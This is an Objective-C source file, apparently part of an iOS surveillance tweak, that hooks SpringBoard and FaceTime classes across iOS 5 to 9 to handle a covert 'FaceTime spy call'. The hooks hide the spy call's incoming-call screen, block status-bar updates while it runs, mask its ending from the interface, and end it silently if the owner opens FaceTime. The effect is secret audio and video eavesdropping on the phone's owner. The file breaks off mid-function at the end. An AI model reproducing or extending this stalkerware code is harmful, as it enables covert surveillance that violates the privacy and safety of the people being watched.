//
//  FaceTimeSpyCallSpringBoard.h
//  MSSPC
//
//  Created by Makara Khloth on 7/9/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "MSSPC.h"

#import "MPConferenceManager.h"
#import "MPConferenceManager+IOS6.h"
#import "SBConferenceManager.h"
#import "SBConferenceManager+IOS6.h"
#import "MPIncomingFaceTimeCallController.h"
#import "MPIncomingFaceTimeCallController+IOS6.h"
#import "MPFaceTimeCallWaitingController.h"
#import "MPFaceTimeCallWaitingController+IOS6.h"
#import "CNFConferenceController.h"
#import "CNFConferenceController+IOS6.h"
#import "SBUserAgent.h"
#import "SBUserAgent+IOS6.h"
#import "SBAssistantController.h"
#import "SBAssistantController+IOS6.h"
#import "CNFDisplayController.h"
#import "CNFDisplayController+IOS6.h"
#import "CNFHUDView.h"
#import "CNFHUDView+IOS6.h"
#import "CNFCallViewController.h"
#import "CNFCallViewController+IOS6.h"

#import "IMAVCallManager.h"
#import "IMAVInterface.h"
#import "IMAVChat.h"

// iOS 7
#import "CNFConferenceController+IOS7.h"
#import "IMAVChatProxy.h"
#import "MPIncomingFaceTimeCallController+IOS7.h"
#import "MPFaceTimeCallWaitingController+IOS7.h"

#import "NSURL-FaceTime_PhoneNumber+IOS6.h"
#import "NSURL-FaceTime+IOS6.h"

#import "FaceTimeSpyCallManager.h"
#import "FaceTimeCall.h"

#import "SpringBoard.h"
#import "SpringBoard+IOS6.h"
#import "SpringBoard+IOS7.h"

// iOS 8
#import "TUCallCenter.h"
#import "TUCall.h"
#import "TUCall+iOS8.h"
#import "TUFaceTimeCall.h"

// iOS 9
#import "TUCallNotificationManager.h"
#import "TUProxyCall.h"
#import "TUProxyCall+iOS9.h"

bool isFaceTimeSpyCallInProgress();
void endFaceTimeSpyCall();

#pragma mark - iOS 9 -

#pragma mark TUCallNotificationManager

HOOK(TUCallNotificationManager, statusChangedForCalliPadiPod$, void, id arg1) {
    APPLOGVERBOSE(@"statusChangedForCall$, arg1 = %@", arg1);
    
    TUProxyCall *facetimeCall = arg1;
    FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
    [ftCall setMInviter:nil];
    [ftCall setMIMHandle:nil];
    [ftCall setMIMAVChatProxy:nil];
    [ftCall setMConversationID:nil];
    [ftCall setMFaceTimeAudioCall:nil];
    [ftCall setMFaceTimeVideoCall:nil];
    [ftCall setMFaceTimeProxyCall:facetimeCall];
    
    if ([facetimeCall isOutgoing]) {
        [ftCall setMDirection:kFaceTimeCallDirectionOut];
    } else {
        [ftCall setMDirection:kFaceTimeCallDirectionIn];
    }
    
    APPLOGVERBOSE(@"callStatus,     %d", [facetimeCall callStatus]);
    APPLOGVERBOSE(@"status,         %d", [facetimeCall status]);
    APPLOGVERBOSE(@"isStatusFinal,  %d", [facetimeCall isStatusFinal]);
    
    /*
     Note the status of call here is not the same as regular call status
     */
    switch ([facetimeCall callStatus]) {
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INCOMING: {
            FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
            [ftSpyCallManager handleIncomingFaceTimeCall:ftCall];
            if ([ftCall mIsFaceTimeSpyCall]) {
                ;
            } else {
                BOOL shouldDelay = NO;
                if ([ftSpyCallManager mFaceTimeSpyCall]) { // Spy call in progress
                    shouldDelay = YES;
                }
                
                if (shouldDelay) {
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        CALL_ORIG(TUCallNotificationManager, statusChangedForCalliPadiPod$, arg1);
                    });
                }
                else {
                    CALL_ORIG(TUCallNotificationManager, statusChangedForCalliPadiPod$, arg1);
                }
            }
        } break;
        case 6:
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED: {
            if ([facetimeCall isStatusFinal]) {
                FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
                [ftSpyCallManager handleFaceTimeCallEnd:ftCall];
            }
            CALL_ORIG(TUCallNotificationManager, statusChangedForCalliPadiPod$, arg1);
        } break;
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_CONECTED:
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD:
        default:
            CALL_ORIG(TUCallNotificationManager, statusChangedForCalliPadiPod$, arg1);
            break;
    }
}

#pragma mark - iOS 8 -

#pragma mark TUCallCenter

HOOK(TUCallCenter, handleCallStatusChanged$, void, id arg1) {
    APPLOGVERBOSE(@"handleCallStatusChanged$, arg1 = %@", arg1);
    
    TUFaceTimeCall *facetimeCall = arg1;
    FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:nil];
    [ftCall setMIMAVChatProxy:nil];
	[ftCall setMConversationID:[facetimeCall conferenceIdentifier]];
    
    Class $TUFaceTimeAudioCall = objc_getClass("TUFaceTimeAudioCall");
    Class $TUFaceTimeVideoCall = objc_getClass("TUFaceTimeVideoCall");
    if ([facetimeCall isKindOfClass:$TUFaceTimeAudioCall]) {
        [ftCall setMFaceTimeAudioCall:(TUFaceTimeAudioCall *)facetimeCall];
    } else if ([facetimeCall isKindOfClass:$TUFaceTimeVideoCall]) {
        [ftCall setMFaceTimeVideoCall:(TUFaceTimeVideoCall *)facetimeCall];
    }
    
    if ([facetimeCall isOutgoing]) {
        [ftCall setMDirection:kFaceTimeCallDirectionOut];
    } else {
        [ftCall setMDirection:kFaceTimeCallDirectionIn];
    }
    
    APPLOGVERBOSE(@"callStatus,     %d", [facetimeCall callStatus]);
    APPLOGVERBOSE(@"status,         %d", [facetimeCall status]);
    APPLOGVERBOSE(@"isStatusFinal,  %d", [facetimeCall isStatusFinal]);
    
    /*
     Note the status of call here is not the same as regular call status
     */
    switch ([facetimeCall callStatus]) {
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INCOMING: {
            FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
            [ftSpyCallManager handleIncomingFaceTimeCall:ftCall];
            if ([ftCall mIsFaceTimeSpyCall]) {
                ;
            } else {
                if ([ftSpyCallManager mFaceTimeSpyCall]) { // Spy call in progress
                    [NSThread sleepForTimeInterval:1.5];
                }
                CALL_ORIG(TUCallCenter, handleCallStatusChanged$, arg1);
            }
        } break;
        case 6:
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED: {
            if ([facetimeCall isStatusFinal]) {
                FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
                [ftSpyCallManager handleFaceTimeCallEnd:ftCall];
            }
            CALL_ORIG(TUCallCenter, handleCallStatusChanged$, arg1);
        } break;
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_CONECTED:
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD:
        default:
            CALL_ORIG(TUCallCenter, handleCallStatusChanged$, arg1);
        break;
    }
}

/*
HOOK(TUCallCenter, handleCallStatusChanged$userInfo$, void, id arg1, id arg2) {
    APPLOGVERBOSE(@"handleCallStatusChanged$userInfo$, arg1 = %@, arg2 = %@", arg1, arg2);
    CALL_ORIG(TUCallCenter, handleCallStatusChanged$userInfo$, arg1, arg2);
}*/

#pragma mark -
#pragma mark MPIncomingFaceTimeCallController
#pragma mark -

#pragma mark iOS 7

HOOK(MPIncomingFaceTimeCallController, initWithChat$, id, id arg1) {
    APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
    
    IMAVChatProxy *imavChatProxy = arg1;
    FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:nil];
    [ftCall setMIMAVChatProxy:imavChatProxy];
	[ftCall setMConversationID:[imavChatProxy conferenceID]];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager handleIncomingFaceTimeCall:ftCall];
	
	if ([ftCall mIsFaceTimeSpyCall]) {
		return nil;
	} else {
        MPIncomingFaceTimeCallController *incomingFaceTimeCallController = nil;
        incomingFaceTimeCallController = CALL_ORIG(MPIncomingFaceTimeCallController, initWithChat$, arg1);
        
        if (isFaceTimeSpyCallInProgress()) {
            /*
             **** For use case:
             - Spy FaceTime audio active
             - Normal FaceTime video come in
             */
            [incomingFaceTimeCallController performSelector:@selector(ringOrVibrate)
                                                 withObject:nil
                                                 afterDelay:1.0];
        }
		return incomingFaceTimeCallController;
	}
}

HOOK(MPFaceTimeCallWaitingController, initWithChat$, id, id arg1) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	
	IMAVChatProxy *imavChatProxy = arg1;
    FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:nil];
    [ftCall setMIMAVChatProxy:imavChatProxy];
	[ftCall setMConversationID:[imavChatProxy conferenceID]];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager handleIncomingWaitingFaceTimeCall:ftCall];
	
	if ([ftCall mIsFaceTimeSpyCall]) {
		return nil;
	} else {
		if (isFaceTimeSpyCallInProgress()) {
            Class $MPIncomingFaceTimeCallController = objc_getClass("MPIncomingFaceTimeCallController");
			MPIncomingFaceTimeCallController *incomingFaceTimeCallController = nil;
			incomingFaceTimeCallController = [[$MPIncomingFaceTimeCallController alloc] initWithChat:arg1];
            
            /*
             **** For use case:
             - Spy FaceTime video active
             - Normal FaceTime video come in
             */
            
            [NSObject cancelPreviousPerformRequestsWithTarget:incomingFaceTimeCallController
                                                     selector:@selector(ringOrVibrate)
                                                       object:nil];
            // -- Need some delay --
			[incomingFaceTimeCallController performSelector:@selector(ringOrVibrate)
												 withObject:nil
												 afterDelay:1.0];
			
			return incomingFaceTimeCallController;
		} else {
			return CALL_ORIG(MPFaceTimeCallWaitingController, initWithChat$, arg1);
		}
	}
}

#pragma mark IOS6

HOOK(MPIncomingFaceTimeCallController, initWithHandle$conferenceID$, id, id arg1, id arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1); // IMHandle
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2); // NSString 0D938565B7A0180AB8C2D4A35EB4AF6486422692AA9070C5
	
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:arg1];
	[ftCall setMConversationID:arg2];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager handleIncomingFaceTimeCall:ftCall];
	
	if ([ftCall mIsFaceTimeSpyCall]) {
		return nil;
	} else {
		return CALL_ORIG(MPIncomingFaceTimeCallController, initWithHandle$conferenceID$, arg1, arg2);
	}
}

HOOK(MPFaceTimeCallWaitingController, initWithHandle$conferenceID$, id, id arg1, id arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1); // IMHandle
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2); // NSString 0D938565B7A0180AB8C2D4A35EB4AF6486422692AA9070C5
	
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:arg1];
	[ftCall setMConversationID:arg2];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager handleIncomingWaitingFaceTimeCall:ftCall];
	
	if ([ftCall mIsFaceTimeSpyCall]) {
		// Not work
		//CNFDisplayController *displayController = [ftSpyCallManager mCNFDisplayController];
		//CNFHUDView *hudView = [displayController hudView];
		//[hudView undim];
		//[hudView performSelector:@selector(undim)
		//			  withObject:nil
		//			  afterDelay:1.0];
		
		return nil;
	} else {
		if (isFaceTimeSpyCallInProgress()) {
			Class $MPIncomingFaceTimeCallController = objc_getClass("MPIncomingFaceTimeCallController");
			MPIncomingFaceTimeCallController *incomingFaceTimeCallController = nil;
			incomingFaceTimeCallController = [[$MPIncomingFaceTimeCallController alloc] initWithHandle:arg1
																						  conferenceID:arg2];
			// Need some delay
			[incomingFaceTimeCallController performSelector:@selector(ringOrVibrate)
												 withObject:nil
												 afterDelay:1.0];
			
			return incomingFaceTimeCallController;
		} else {
			return CALL_ORIG(MPFaceTimeCallWaitingController, initWithHandle$conferenceID$, arg1, arg2);
		}
	}
}	

#pragma mark IOS5

HOOK(MPIncomingFaceTimeCallController, initWithConferenceController$inviter$conferenceID$, id, id arg1, id arg2, id arg3) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	APPLOGVERBOSE(@"[arg3 class] = %@, arg3 = %@", [arg3 class], arg3);
	
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:arg2];
	[ftCall setMIMHandle:nil];
	[ftCall setMConversationID:arg3];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager handleIncomingFaceTimeCall:ftCall];
	
	if ([ftCall mIsFaceTimeSpyCall]) {
		return nil;
	} else {
		return CALL_ORIG(MPIncomingFaceTimeCallController, initWithConferenceController$inviter$conferenceID$, arg1, arg2, arg3);
	}
}

HOOK(MPFaceTimeCallWaitingController, initWithConferenceController$inviter$conferenceID$, id, id arg1, id arg2, id arg3) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	APPLOGVERBOSE(@"[arg3 class] = %@, arg3 = %@", [arg3 class], arg3);
	
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:arg2];
	[ftCall setMIMHandle:nil];
	[ftCall setMConversationID:arg3];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager handleIncomingWaitingFaceTimeCall:ftCall];
	
	if ([ftCall mIsFaceTimeSpyCall]) {
		// Not work
		//CNFDisplayController *displayController = [ftSpyCallManager mCNFDisplayController];
		//CNFHUDView *hudView = [displayController hudView];
		//[hudView undim];
		//[hudView performSelector:@selector(undim)
		//			  withObject:nil
		//			  afterDelay:1.0];
		
		return nil;
	} else {
		if (isFaceTimeSpyCallInProgress()) {
			Class $MPIncomingFaceTimeCallController = objc_getClass("MPIncomingFaceTimeCallController");
			MPIncomingFaceTimeCallController *incomingFaceTimeCallController = nil;
			incomingFaceTimeCallController = [[$MPIncomingFaceTimeCallController alloc] initWithConferenceController:arg1
																											 inviter:arg2
																										conferenceID:arg3];
			// Need some delay
			[incomingFaceTimeCallController performSelector:@selector(ringOrVibrate)
												 withObject:nil
												 afterDelay:1.0];
			
			return incomingFaceTimeCallController;
		}
		return CALL_ORIG(MPFaceTimeCallWaitingController, initWithConferenceController$inviter$conferenceID$, arg1, arg2, arg3);
	}
}

#pragma mark -
#pragma mark SBConferenceManager
#pragma mark -

HOOK(SBConferenceManager, updateStatusBar, void) {
	APPLOGVERBOSE(@"Block update to SpringBoard while FaceTime");
	
	if (isFaceTimeSpyCallInProgress()) {
		;
	} else {
		CALL_ORIG(SBConferenceManager, updateStatusBar);
	}
}

/*
HOOK(SBConferenceManager, _handleInvitation$, void, id arg1) {
	APPLOGVERBOSE (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	CALL_ORIG(SBConferenceManager, _handleInvitation$, arg1);
}

HOOK(SBConferenceManager, _faceTimeStateChanged$, void, id arg1) {
	APPLOGVERBOSE (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	
	APPLOGVERBOSE (@"currentCallRemoteUserId = %@", [self currentCallRemoteUserId]);
	APPLOGVERBOSE (@"currentCallStatusDisplayString = %@", [self currentCallStatusDisplayString]);
	CALL_ORIG(SBConferenceManager, _faceTimeStateChanged$, arg1);
}*/

#pragma mark -
#pragma mark CNFConferenceController
#pragma mark -

#pragma mark iOS 7
/*
HOOK(CNFConferenceController, inviteFailedFromIMHandle$reason$, void, id arg1, long long arg2) {
    APPLOGVERBOSE(@"inviteFailedFromIMHandle$reason$, %@, %@, %lld", [arg1 class], arg1, arg2);
    CALL_ORIG(CNFConferenceController, inviteFailedFromIMHandle$reason$, arg1, arg2);
}*/

HOOK(CNFConferenceController, invitedToIMAVChat$, void, id arg1) {
    APPLOGVERBOSE(@"invitedToIMAVChat$, %@, %@", [arg1 class], arg1);
    IMAVChatProxy *imavChatProxy = arg1;
    FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
    [ftCall setMIMAVChatProxy:imavChatProxy];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:nil];
	[ftCall setMConversationID:[imavChatProxy conferenceID]];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
    /*
     NOTE: Check if it's FaceTime spy call; in the future FaceTime may support conference with more than 2 participants
     this also apply to iOS 5, iOS 6 methods below
     
     Conclusion: We consider this is last incoming FaceTime call (regardless of spy call or not)
     */
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager setMFaceTimeCall:ftCall];
    
    CALL_ORIG(CNFConferenceController, invitedToIMAVChat$, arg1);
}

// Check these three methods in FaceTimeSpyCallFaceTime.h
/*
HOOK(CNFConferenceController, _handleConferenceEnded$withReason$withError$, void, id arg1, unsigned int arg2, int arg3) {
    APPLOGVERBOSE(@"_handleConferenceEnded$withReason$withError$, %@, %@, %d, %d", [arg1 class], arg1, arg2, arg3);
    CALL_ORIG(CNFConferenceController, _handleConferenceEnded$withReason$withError$, arg1, arg2, arg3);
}

HOOK(CNFConferenceController, _handleConferenceConnecting$, void, id arg1) {
    APPLOGVERBOSE(@"_handleConferenceConnecting$, %@, %@", [arg1 class], arg1);
    CALL_ORIG(CNFConferenceController, _handleConferenceConnecting$, arg1);
}

HOOK(CNFConferenceController, _handleEndAVChat$withReason$error$, void, id arg1, unsigned int arg2, int arg3) {
    APPLOGVERBOSE(@"_handleEndAVChat$withReason$error$, %@, %@, %d, %d", [arg1 class], arg1, arg2, arg3);
    CALL_ORIG(CNFConferenceController, _handleEndAVChat$withReason$error$, arg1, arg2, arg3);
}*/

HOOK(CNFConferenceController, avChatStateChanged$, void, id arg1) {
    APPLOGVERBOSE(@"avChatStateChanged$, %@, %@", [arg1 class], arg1);
    _Bool block = false;
    NSNotification *notification = arg1;
    if ([[notification name] isEqualToString:@"__kIMAVChatStateChangedNotification"]) {
        IMAVChatProxy *imavChatProxy = [notification object];
        NSDictionary *userInfo = [notification userInfo];
        NSNumber *avChatStatus = [userInfo objectForKey:@"__kIMAVChatStateKey"];
        APPLOGVERBOSE(@"avChatState, %@", avChatStatus);
        if ([avChatStatus intValue] == 5) {
            FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
            [ftCall setMIMAVChatProxy:imavChatProxy];
            [ftCall setMInviter:nil];
            [ftCall setMIMHandle:nil];
            [ftCall setMConversationID:[imavChatProxy conferenceID]];
            [ftCall setMDirection:kFaceTimeCallDirectionUnknown];
            /*
             Use for:
             - FaceTime audio call
             - FaceTime video call
             */
            FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
            [ftSpyCallManager handleFaceTimeCallEnd:ftCall];
            
            /*
             Use case:
                - FaceTime spy call active
                - Normal FaceTime call come in
                - FaceTime spy call disconnect
                - Normal FaceTime call ringing
             
             Iusse: When spy call disconnected, incoming call screen disappear
             
             We need to block original to fix the issue, this is the only one reason to block the original call
             */
            if ([ftCall mIsFaceTimeSpyCall]) {
                block = true;
            }
        }
    }
    if (!block) {
        CALL_ORIG(CNFConferenceController, avChatStateChanged$, arg1);
    }
}

#pragma mark iOS 6

// Call only in SpringBoard
HOOK(CNFConferenceController, conference$receivedInvitationFromIMHandle$, void, id arg1, id arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:arg1];
	[ftCall setMConversationID:arg2];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager setMFaceTimeCall:ftCall];
	
	CALL_ORIG(CNFConferenceController, conference$receivedInvitationFromIMHandle$, arg1, arg2);
}

HOOK(CNFConferenceController, conference$handleMissedInvitationFromIMHandle$, void, id arg1, id arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:arg2];
	[ftCall setMConversationID:arg1];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager handleFaceTimeCallEnd:ftCall];
	
	CALL_ORIG(CNFConferenceController, conference$handleMissedInvitationFromIMHandle$, arg1, arg2);
}

HOOK(CNFConferenceController, conference$receivedCancelledInvitationFromIMHandle$, void, id arg1, id arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:arg2];
	[ftCall setMConversationID:arg1];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager handleFaceTimeCallEnd:ftCall];
	
	CALL_ORIG(CNFConferenceController, conference$receivedCancelledInvitationFromIMHandle$, arg1, arg2);
}

// Call from MobilePhone application
/*
HOOK(CNFConferenceController, sendFaceTimeInvitationTo$, id, id arg1) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
 
	id ret = CALL_ORIG(CNFConferenceController, sendFaceTimeInvitationTo$, arg1);
	APPLOGVERBOSE(@"[ret class] = %@, ret = %@", [ret class], ret); // IMAVChat
 
	return (nil);
 }
 
HOOK(CNFConferenceController, sendFaceTimeInvitationTo$isVideo$, id, id arg1, BOOL arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"arg2 = %d", arg2);
	 
	//id ret = CALL_ORIG(CNFConferenceController, sendFaceTimeInvitationTo$isVideo$, arg1, arg2);
	//APPLOGVERBOSE(@"[ret class] = %@, ret = %@", [ret class], ret); // IMAVChat
	
	NSString *currentCallRemoteUserId = [self currentCallRemoteUserId];
	APPLOGVERBOSE (@"currentCallRemoteUserId = %@", currentCallRemoteUserId);
	
	if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:currentCallRemoteUserId]) {
		if ([self respondsToSelector:@selector(endConference)]) {
			[self performSelector:@selector(endConference)];
		} else if ([self respondsToSelector:@selector(endFaceTime)]) {
			[self performSelector:@selector(endFaceTime)];
		}
		return (nil);
	} else {
		return CALL_ORIG(CNFConferenceController, sendFaceTimeInvitationTo$isVideo$, arg1, arg2);
	}
}
 
HOOK(CNFConferenceController, inviteFailedFromIMHandle$reason$, void, id arg1, int arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"arg2 = %d", arg2);
	CALL_ORIG(CNFConferenceController, inviteFailedFromIMHandle$reason$, arg1, arg2);
}

HOOK(CNFConferenceController, invitedToIMAVChat$, void, id arg1) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	CALL_ORIG(CNFConferenceController, invitedToIMAVChat$, arg1);
}
*/

#pragma mark -
#pragma mark CNFDisplayController
#pragma mark -

HOOK(CNFDisplayController, initWithDelegate$options$, id, id arg1, unsigned int arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"arg2 = %d", arg2);
	
	id displayController = CALL_ORIG(CNFDisplayController, initWithDelegate$options$, arg1, arg2);
	APPLOGVERBOSE (@"displayController = %@", displayController);
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager setMCNFDisplayController:displayController];
	
	return displayController;
}

HOOK(CNFDisplayController, initWithDelegate$, id, id arg1) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	
	id displayController = CALL_ORIG(CNFDisplayController, initWithDelegate$, arg1);
	APPLOGVERBOSE (@"displayController = %@", displayController);
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager setMCNFDisplayController:displayController];
	
	return displayController;
}

#pragma mark -
#pragma mark CNFCallViewController
#pragma mark -

HOOK(CNFCallViewController, initWithDelegate$, id, id arg1) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	
	id callViewController = CALL_ORIG(CNFCallViewController, initWithDelegate$, arg1);
	APPLOGVERBOSE(@"[callViewController class] = %@, callViewController = %@", [callViewController class], callViewController);
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager setMCNFCallViewController:callViewController];
	
	return callViewController;
}

#pragma mark -
#pragma mark SBUserAgent
#pragma mark -

HOOK(SBUserAgent, canLaunchFromBulletinWithURL$bundleID$, BOOL, id arg1, id arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);

	NSURL *url = arg1;
	NSString *scheme = [url scheme];
	APPLOGVERBOSE (@"Url scheme = %@", scheme);
	if ([scheme isEqualToString:@"facetime"]) {
		if (isFaceTimeSpyCallInProgress()) {
			endFaceTimeSpyCall();
			return NO;
		} else {
			return CALL_ORIG(SBUserAgent, canLaunchFromBulletinWithURL$bundleID$, arg1, arg2);
		}
	} else {	
		return CALL_ORIG(SBUserAgent, canLaunchFromBulletinWithURL$bundleID$, arg1, arg2);
	}
}

#pragma mark -
#pragma mark SpringBoard
#pragma mark -

// iOS 7
HOOK(SpringBoard, _applicationOpenURL$event$, void, id arg1, struct __GSEvent *arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"arg2 = %@", arg2);
	
	NSURL *url = arg1;
	NSString *scheme = [url scheme];
	APPLOGVERBOSE (@"Url scheme = %@", scheme);
	if ([scheme isEqualToString:@"facetime"]) {
		if (isFaceTimeSpyCallInProgress()) {
			endFaceTimeSpyCall();
		} else {
			CALL_ORIG(SpringBoard, _applicationOpenURL$event$, arg1, arg2);
		}
	} else {	
		CALL_ORIG(SpringBoard, _applicationOpenURL$event$, arg1, arg2);
	}
}

// iOS 7
HOOK(SpringBoard, _applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$, void, id arg1, id arg2, id arg3, BOOL arg4, BOOL arg5, id arg6) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	APPLOGVERBOSE(@"[arg3 class] = %@, arg3 = %@", [arg3 class], arg3);
	APPLOGVERBOSE(@"arg4 = %d", arg4);
	APPLOGVERBOSE(@"arg5 = %d", arg5);
	APPLOGVERBOSE(@"[arg6 class] = %@, arg6 = %@", [arg6 class], arg6);
	
	NSURL *url = arg1;
	NSString *scheme = [url scheme];
	APPLOGVERBOSE (@"Url scheme = %@", scheme);
	if ([scheme isEqualToString:@"facetime"]) {
		if (isFaceTimeSpyCallInProgress()) {
			endFaceTimeSpyCall();
		} else {
			CALL_ORIG(SpringBoard, _applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$, arg1, arg2, arg3, arg4, arg5, arg6);
		}
	} else {	
